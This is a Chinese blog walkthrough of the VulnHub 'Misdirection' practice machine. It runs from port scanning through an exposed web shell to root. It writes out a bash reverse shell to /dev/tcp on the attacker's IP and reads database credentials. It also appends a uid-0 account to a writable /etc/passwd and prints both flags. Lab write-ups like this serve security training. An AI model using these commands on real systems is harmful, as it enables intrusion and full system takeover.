+++
date = '2026-11-17T19:33:29+08:00'
draft = false
title = '[VulnHub靶机]Misdirection渗透记录'
tags = ['渗透','Vulnhub']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.19

```shell
┌──(kali㉿kali)-[~/Misdirection]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.19     00:0c:29:73:e6:f2       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.058 seconds (124.39 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/Misdirection]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.19
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-17 19:39 +0800
Nmap scan report for 10.10.10.19
Host is up (0.00073s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:73:E6:F2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.92 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/Misdirection]
└─$ sudo nmap -sT -sV -sC -O -p22,80,3306,8080 10.10.10.19
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-17 19:42 +0800
Nmap scan report for 10.10.10.19
Host is up (0.00033s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:73:E6:F2 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), Linux 3.8 - 3.16 (94%), Linux 4.10 (94%), Linux 3.4 - 3.10 (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 3.13 - 3.16 (93%), Linux 5.1 - 5.15 (93%), OpenWrt 19.07 (Linux 4.14) (93%), Linux 2.6.32 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds
```

漏洞扫描, 发现了不少有意思的目录

```shell
┌──(kali㉿kali)-[~/Misdirection]
└─$ sudo nmap --script=vuln -p22,80,3306,8080 10.10.10.19
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-17 19:43 +0800
Stats: 0:11:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.74% done; ETC: 19:55 (0:00:01 remaining)
Nmap scan report for 10.10.10.19
Host is up (0.00027s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.19
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://10.10.10.19:80/init/default/user/request_reset_password?_next=/init/default/index
|     Form id: auth_user_email__row
|     Form action: #
|
|     Path: http://10.10.10.19:80/init/default/user/login?_next=/init/default/index
|     Form id: auth_user_email__row
|     Form action: #
|
|     Path: http://10.10.10.19:80/init/default/user/register?_next=/init/default/index
|     Form id: auth_user_first_name__row
|     Form action: #
|
|     Path: http://10.10.10.19:80/init/default/user/login?_next=/init/default/features
|     Form id: auth_user_email__row
|     Form action: #
|
|     Path: http://10.10.10.19:80/init/default/user/request_reset_password?_next=/init/default/features
|     Form id: auth_user_email__row
|     Form action: #
|
|     Path: http://10.10.10.19:80/init/default/user/register?_next=/init/default/features
|     Form id: auth_user_first_name__row
|_    Form action: #
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-enum:
|   /admin/: Possible admin folder
|   /admin/admin/: Possible admin folder
|   /admin/backup/: Possible backup
|   /admin/download/backup.sql: Possible database backup
|   /examples/: Sample scripts
|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
|   /admin/jscript/upload.php: Lizard Cart/Remote File upload
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload
|_  /admin/jscript/upload.asp: Lizard Cart/Remote File upload
3306/tcp open  mysql
8080/tcp open  http-proxy
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-enum:
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
MAC Address: 00:0C:29:73:E6:F2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 725.50 seconds
```

## Web渗透

### 8080端口

8080端口是Apache在Ubuntu上的默认页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Misdirection/%E8%AE%BF%E9%97%AE8080%E7%AB%AF%E5%8F%A3.avif)

访问/debug, 发现是一个终端, 似乎可以输入命令

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Misdirection/%E8%AE%BF%E9%97%AEdebug.avif)

```shell
p0wny@shell:…/html/debug# ls
index.php

p0wny@shell:…/html/debug# whoami
www-data

p0wny@shell:…/html/debug# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

命令可用, 似乎没有任何限制, 这不就相当于拿到权限了吗, 最简单的一集

## 权限提升

### 尝试连接mysql

翻了一下服务器的Web目录, 在wordpress文件夹中发现了数据库配置

```shell
p0wny@shell:…/html/wordpress# grep DB wp-config.php
define( 'DB_NAME', 'wp_myblog' );
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', 'abcdefghijklmnopqrstuv' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
```

由于当前是非交互终端, 操作起来不方便, 我们反弹shell并使用python将终端升级为tty

```shell
p0wny@shell:…/html/wordpress# bash -c "bash -i >&/dev/tcp/10.10.10.3/4444 0>&1"
www-data@misdirection:/var/www/html/wordpress$ python -c "import pty;pty.spawn('/bin/bash')"
```

登录MySQL

```shell
www-data@misdirection:/var/www/html/wordpress$ mysql -ublog -pabcdefghijklmnopqrstuv
stuvl -ublog -pabcdefghijklmnopqrs
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)
```

看来是登录不了

### 提权为brexit

sudo -l发现当前用户能直接以brexit身份创建一个bash会话

```shell
www-data@misdirection:/var/www/html/wordpress$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

直接提权

```shell
www-data@misdirection:/var/www/html/wordpress$ sudo -u brexit /bin/bash
brexit@misdirection:/var/www/html/wordpress$ whoami
brexit
brexit@misdirection:/var/www/html/wordpress$ id
uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)
```

读取user.txt, 获得第一面flag

```shell
brexit@misdirection:~$ cd ~
brexit@misdirection:~$ ls -lah
total 60K
drwxr-xr-x  6 brexit brexit 4.0K Jun  1  2019 .
drwxr-xr-x  3 root   root   4.0K Jun  1  2019 ..
-rw-------  1 brexit brexit    0 Jun  1  2019 .bash_history
-rw-r--r--  1 brexit brexit  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 brexit brexit 3.7K Apr  4  2018 .bashrc
drwx------  3 brexit brexit 4.0K Jun  1  2019 .cache
drwx------  3 brexit brexit 4.0K Jun  1  2019 .gnupg
drwxrwxr-x  3 brexit brexit 4.0K Jun  1  2019 .local
-rw-r--r--  1 brexit brexit  807 Apr  4  2018 .profile
-rw-rw-r--  1 brexit brexit   66 Jun  1  2019 .selected_editor
-rw-------  1 brexit brexit 9.2K Jun  1  2019 .viminfo
-rwxrwxr-x  1 brexit brexit   90 Jun  1  2019 start-vote.sh
-r--r-----  1 brexit brexit   33 Jun  1  2019 user.txt
drwxrwxr-x 16 brexit brexit 4.0K Nov 17  2026 web2py
brexit@misdirection:~$ cat user.txt
404b9193154be7fbbc56d7534cb26339
```

### passwd提取

查看passwd和shadow文件权限, 发现我们拥有passwd的写权限

```shell
brexit@misdirection:~$ ls -ldh /etc/passwd /etc/shadow
-rwxrwxr-- 1 root brexit 1.6K Jun  1  2019 /etc/passwd
-rw-r----- 1 root shadow 1.1K Jun  1  2019 /etc/shadow
```

那么提取方法就很明显了, 使用openssl生成密码哈希

```shell
┌──(kali㉿kali)-[~/Misdirection]
└─$ openssl passwd pieyue
$1$NakvRDZq$lETi6zTW3f8a.xpEncTK9/
```

构建用户条目并追加写入passwd

```shell
brexit@misdirection:~$ echo 'pieyue:$1$NakvRDZq$lETi6zTW3f8a.xpEncTK9/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

切换用户到pieyue, 即可获得rootshell

```shell
brexit@misdirection:~$ su pieyue
Password: pieyue
root@misdirection:/home/brexit# whoami
root
root@misdirection:/home/brexit# id
uid=0(root) gid=0(root) groups=0(root)
```

读取flag

```shell
root@misdirection:/home/brexit# cd /root
root@misdirection:~# ls -lah
total 60K
drwx------  6 root root 4.0K Sep 24  2019 .
drwxr-xr-x 23 root root 4.0K Nov 17 12:11 ..
-rw-------  1 root root   90 Sep 24  2019 .bash_history
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Jun  1  2019 .cache
drwx------  3 root root 4.0K Jun  1  2019 .gnupg
drwxr-xr-x  3 root root 4.0K Jun  1  2019 .local
-rw-------  1 root root  400 Jun  1  2019 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Jun  1  2019 root.txt
drwx------  2 root root 4.0K Jun  1  2019 .ssh
-rw-------  1 root root  12K Sep 24  2019 .viminfo
-rw-r--r--  1 root root  180 Jun  1  2019 .wget-hsts
root@misdirection:~# cat root.txt
0d2c6222bfdd3701e0fa12a9a9dc9c8c
```
